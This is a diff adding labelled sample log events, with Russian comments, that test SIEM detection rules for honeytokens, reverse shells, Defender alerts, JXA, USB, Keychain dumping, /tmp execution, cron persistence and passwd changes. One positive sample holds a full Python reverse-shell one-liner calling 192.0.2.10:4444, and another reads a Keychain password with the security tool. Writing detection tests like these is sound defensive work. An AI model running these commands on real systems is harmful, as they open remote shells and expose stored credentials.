@@ -26,5 +26,101 @@
                "winlogbeat_winlog_event_data_TicketEncryptionType": "0x12",
                "winlogbeat_winlog_event_data_ServiceName": "MSSQLSvc"}}
     ]
+  },
+  "CANARY - Открытие honeytoken-файла": {
+    "positive": [
+      {"why": "ручной: успешный openat honeytoken процессом cat",
+       "doc": {"audit_type": "SYSCALL", "key": "honeytoken", "success": "yes", "syscall": "257", "exe": "/usr/bin/cat", "source": "rt-linux"}}
+    ],
+    "negative": [
+      {"why": "ручной: штатный файловый мониторинг Wazuh исключён",
+       "doc": {"audit_type": "SYSCALL", "key": "honeytoken", "success": "yes", "syscall": "257", "exe": "/var/ossec/bin/wazuh-syscheckd", "source": "rt-linux"}},
+      {"why": "ручной: getxattr при просмотре ls не является открытием файла",
+       "doc": {"audit_type": "SYSCALL", "key": "honeytoken", "success": "yes", "syscall": "191", "exe": "/usr/bin/ls", "source": "rt-linux"}}
+    ]
+  },
+  "LNX - Обратная оболочка (python, perl, nc, socat, mkfifo)": {
+    "positive": [
+      {"why": "ручной: Python socket с dup2 и pty.spawn — обратная оболочка",
+       "doc": {"audit_type": "PROCTITLE", "proctitle": "/usr/bin/python3 -c import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")", "source": "rt-linux"}}
+    ],
+    "negative": [
+      {"why": "ручной: SMTP healthcheck открывает socket без shell",
+       "doc": {"audit_type": "PROCTITLE", "proctitle": "/usr/bin/python3 -c import socket;socket.create_connection((\"host.containers.internal\",25),3)", "source": "rt-linux"}}
+    ]
+  },
+  "Windows - Defender обнаружил угрозу или отключён": {
+    "positive": [
+      {"why": "ручной: угроза обезвредена в канале Microsoft Defender",
+       "doc": {"win_channel": "Microsoft-Windows-Windows Defender/Operational", "win_event_id": "1117", "source": "rt-windows"}}
+    ],
+    "negative": [
+      {"why": "ручной: тот же Event ID в постороннем канале WPN не относится к Defender",
+       "doc": {"win_channel": "Microsoft-Windows-WPN/Operational", "win_event_id": "1117", "source": "rt-windows"}}
+    ]
+  },
+  "macOS - JXA-скрипт через osascript": {
+    "positive": [
+      {"why": "ручной: обычный JXA без сигнатур разрешённой UI-автоматизации",
+       "doc": {"log_type": "macos_osquery", "name": "suspicious_processes", "columns_cmdline": "/usr/bin/osascript -l JavaScript -e 'ObjC.import(\"Foundation\");$.NSHomeDirectory()'", "source": "rt-mac"}}
+    ],
+    "negative": [
+      {"why": "ручной: снятие скриншота через JXA разрешено только по полной сигнатуре",
+       "doc": {"log_type": "macos_osquery", "name": "suspicious_processes", "columns_cmdline": "/usr/bin/osascript -l JavaScript -e 'CGWindowListCopyWindowInfo();NSRunningApplication();NSBitmapImageFileTypePNG'", "source": "rt-mac"}},
+      {"why": "ручной: чтение иконки приложения через JXA разрешено только по полной сигнатуре",
+       "doc": {"log_type": "macos_osquery", "name": "suspicious_processes", "columns_cmdline": "/usr/bin/osascript -l JavaScript -e 'iconDataURL();NSWorkspace();TIFFRepresentation();base64EncodedStringWithOptions()'", "source": "rt-mac"}}
+    ]
+  },
+  "macOS - Подключён USB-накопитель": {
+    "positive": [
+      {"why": "ручной: запуск драйвера USB Mass Storage",
+       "doc": {"log_type": "macos_unified", "processImagePath": "/kernel", "senderImagePath": "/System/Library/Extensions/IOUSBMassStorageDriver.kext/Contents/MacOS/IOUSBMassStorageDriver", "message": "USBMSC start", "source": "rt-mac"}}
+    ],
+    "negative": [
+      {"why": "ручной: остановка драйвера не является подключением",
+       "doc": {"log_type": "macos_unified", "processImagePath": "/kernel", "senderImagePath": "/System/Library/Extensions/IOUSBMassStorageDriver.kext/Contents/MacOS/IOUSBMassStorageDriver", "message": "USBMSC stop", "source": "rt-mac"}},
+      {"why": "ручной: завершение после start отфильтровано как termination",
+       "doc": {"log_type": "macos_unified", "processImagePath": "/kernel", "senderImagePath": "/System/Library/Extensions/IOUSBMassStorageDriver.kext/Contents/MacOS/IOUSBMassStorageDriver", "message": "start detected termination", "source": "rt-mac"}}
+    ]
+  },
+  "macOS - Выгрузка паролей из Keychain (security dump-keychain)": {
+    "positive": [
+      {"why": "ручной: security действительно печатает пароль Keychain",
+       "doc": {"log_type": "macos_osquery", "name": "es_process_events", "columns_cmdline": "/usr/bin/security find-generic-password -w -s lab-test", "source": "rt-mac"}}
+    ],
+    "negative": [
+      {"why": "ручной: Python обрабатывает PDF со строкой find-generic-password, не вызывая security",
+       "doc": {"log_type": "macos_osquery", "name": "es_process_events", "columns_cmdline": "/usr/bin/python3 export_pdf.py --text find-generic-password", "message": "find-generic-password", "source": "rt-mac"}}
+    ]
+  },
+  "LNX - Запуск из /tmp, /dev/shm, /var/tmp": {
+    "positive": [
+      {"why": "ручной: точное правило сохраняет запуск исполняемого файла из /tmp",
+       "doc": {"audit_type": "EXECVE", "a0": "/tmp/dropper", "source": "rt-linux"}}
+    ],
+    "negative": [
+      {"why": "ручной: curl с cookie в /tmp не является запуском программы из /tmp",
+       "doc": {"audit_type": "EXECVE", "a0": "/usr/bin/curl", "a1": "https://example.test", "message": "curl --cookie /tmp/cookies.txt", "source": "rt-linux"}}
+    ]
+  },
+  "LNX - Закрепление через cron": {
+    "positive": [
+      {"why": "ручной: auditd пометил изменение cron ключом cron_persistence",
+       "doc": {"audit_type": "SYSCALL", "key": "cron_persistence", "exe": "/usr/bin/crontab", "source": "rt-linux"}}
+    ],
+    "negative": [
+      {"why": "ручной: PATH со словом cron без ключа детекта не достаточен",
+       "doc": {"audit_type": "PATH", "message": "/etc/cron.d", "source": "rt-linux"}}
+    ]
+  },
+  "LNX - Изменение /etc/passwd, shadow, group": {
+    "positive": [
+      {"why": "ручной: пользовательский процесс изменил файл учётных записей",
+       "doc": {"audit_type": "SYSCALL", "key": "etcpasswd", "exe": "/usr/bin/passwd", "auid": "1000", "source": "rt-linux"}}
+    ],
+    "negative": [
+      {"why": "ручной: штатная проверка Wazuh по-прежнему исключена",
+       "doc": {"audit_type": "SYSCALL", "key": "etcpasswd", "exe": "/var/ossec/bin/wazuh-syscheckd", "auid": "1000", "source": "rt-linux"}}
+    ]
   }
 }
